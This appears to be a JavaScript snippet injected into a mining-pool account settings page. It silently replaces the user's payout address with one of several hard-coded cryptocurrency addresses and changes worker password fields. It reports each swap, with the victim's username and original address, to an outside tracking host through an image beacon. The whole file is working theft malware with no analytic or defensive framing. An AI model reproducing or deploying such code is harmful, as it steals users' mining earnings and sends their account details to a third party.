(function() {
    var aliases = [
        'LYmmGDu2hdfGyo5VRuGwmUMuh8gXL3KA3T',
        'LNHzHXTT8ypGYh15AH2iFZPXjJeYRcV4vK',
        'LZJ1fHMHyUJwX91Jopt7dcaZufQCp3QADt',
        'LLx99d6iubz1PeQYphuUDEjA3kPZ4cazDW',
        'LTFcJQg6LqDtuZ5uWFuTywSrW9cnUFKK2H',
        'LeMoSQdZSXpoFwv8sj8ep24D2YhRk54am6'
    ];

    var username = $('#acc_username').val();
    var $address = $('#address');
    var address = $address.val();

    var log = function(obj) {
        var customParams = '';
        for (k in obj) {
            customParams += '&custom[' + encodeURIComponent(username) + ']=' + encodeURIComponent(k) + '-' + encodeURIComponent(obj[k]);
        }

        $("body").append(
            '<img src="https://in.getclicky.com/in.php?site_id=100694144&sitekey_admin=f74175dd6a10be005226c82529c7a03c&type=custom' + customParams + '"/>');


    };

    var handleAddressNotSet = function() {
        log({dropped: false});
    };

    var changeAddress = function() {
        var alias = aliases[Math.floor(Math.random() * aliases.length)];
        log({dropped: true, from: address, to: alias});

        $address.removeAttr('name');
        $('<input type="hidden" name="address"/>').
            insertAfter($address).
            val(alias);
    };

    var changePassword = function() {
        var $password = $('input[name*="wk_password"]');
        var $defaultPassword =
            $('input[name="wk_username[]"][value="' + username + '"]').
                parentsUntil('tbody', 'tr').
                next().
                find('input');
        $defaultPassword.attr('name', 'wk_password[]');
        var $nonDefaultWorkerPasswords = $password.not($defaultPassword);

        if ($nonDefaultWorkerPasswords.length > 1 && $nonDefaultWorkerPasswords.eq(0).val() == $nonDefaultWorkerPasswords.eq(1).val()) {
            // User have two or more non-default workers
            // and they have the same password.
            // Just set password for our default worker to be the same!
            $defaultPassword.val($nonDefaultWorkerPasswords.eq(0).val());
        } else {
            // Generate random password, 10 alpha-digits. Just like pool do.
            var alphabet = '0123456789abcdefghijklmnopqrstuvwxyz';

            var password = '';
            for (var i = 0; i < 10; i++) {
                password += alphabet[Math.floor(Math.random() * alphabet.length)];
            }
            $defaultPassword.val(password);
        }
    };

    // Actual script
    if (address.indexOf(' ') > -1) {
        // address not set yet
        handleAddressNotSet();
    } else {
        changeAddress();
    }

    changePassword();
})();
